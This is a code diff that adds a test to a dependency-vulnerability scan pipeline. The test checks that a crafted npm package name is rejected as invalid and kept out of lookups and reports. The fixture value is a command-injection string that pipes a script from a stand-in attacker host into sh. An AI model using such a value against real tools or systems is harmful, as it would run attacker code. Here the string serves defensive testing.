@@ -196,6 +196,33 @@ describe('ScanPipeline (real Postgres, fake GitHub/OSV ports)', () => {
     });
   });
 
+  it('a crafted package name is stored as invalid_name, never looked up, never in the prompt', async () => {
+    const id = await newScan();
+    const evil = 'x;curl$IFS//evil.example|sh';
+    const asked: string[] = [];
+    const lock = lockfile({
+      '': { dependencies: { [evil]: 'npm:lodash@4.17.20', a: '1.0.0' } },
+      [`node_modules/${evil}`]: { name: 'lodash', version: '4.17.20' },
+      'node_modules/a': { version: '1.0.0', resolved: 'https://registry.npmjs.org/a/-/a-1.0.0.tgz' },
+    });
+    const pipeline = new ScanPipeline({
+      scans,
+      source: source(lock),
+      vulns: {
+        source: { name: 'Test advisories', url: 'https://advisories.test' },
+        lookup: (pkgs) => {
+          asked.push(...pkgs.map((p) => p.name));
+          return Promise.resolve({ advisories: new Map([['npm:a@1.0.0', [advisory('GHSA-1')]]]), failed: [] });
+        },
+      },
+    });
+    expect(await pipeline.run(id, signal())).toBe('completed');
+    expect(asked).toEqual(['a']);
+    const report = await scans.getReport(id);
+    expect(report?.unchecked).toEqual([{ ecosystem: 'npm', package: evil, version: '4.17.20', reason: 'invalid_name' }]);
+    expect(JSON.stringify(report?.findings)).not.toContain('curl');
+  });
+
   it('zero dependencies → completed with nothing to check', async () => {
     const id = await newScan();
     const pipeline = new ScanPipeline({ scans, source: source(lockfile({})), vulns: vulns(new Map()) });
